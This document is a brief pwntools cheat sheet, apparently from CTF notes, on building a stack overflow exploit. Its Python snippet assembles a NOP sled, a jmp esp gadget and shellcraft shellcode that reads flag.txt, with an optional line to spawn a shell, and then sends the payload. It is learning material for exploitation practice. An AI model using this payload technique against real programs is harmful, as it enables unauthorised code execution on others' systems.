##### Generate a template
```bash
pwn template -h
pwn template ./mybin
```

```python
context.log_level = 'debug' # enable debug log
p64(0x00112345) # get a x64 address

jmp_esp = asm('jmp esp') # get asm for this instruction
jmp_esp = next(elf.search(jmp_esp)) # jmp_esp will contains the address to a jmp_esp gadget
# or you can directly use a address found with ropper, see [[ROP chains]]
# jmp_esp = p64(0x0000123567890012)


# generate some shellcode
# using the shellcraft library

shellcode = asm(shellcraft.cat('flag.txt'))
# or you can use the following to spawn a shell
# shellcode += asm(shellcraft.sh())
shellcode += asm(shellcraft.exit())

# build a payload
payload = flat(
    asm('nop') * padding, # padding could be anything nop, 'A', we don't give a fuck
    jmp_esp, # ROP gadget
    asm('nop') * 16, # "it's a good idea to leave some slack between the gadget and the shellcode, so we use NOP opcode here", for more info : https://youtu.be/4zut2Mjgh5M?list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94&t=579
    shellcode
)
# sometime when creating your shellcode, you could have some bad characters that cause the program to crash, like newlines or null bytes, it's a good idea to generate shellcode encoded in this case

# write payload to file
write("payload", payload)

# wait then send your payload
io.sendlineafter(b':', payload)
```

---

### Other notes
`p64()` func of pwntool is used to "pack", so to convert a value (int for exemple) into bytes !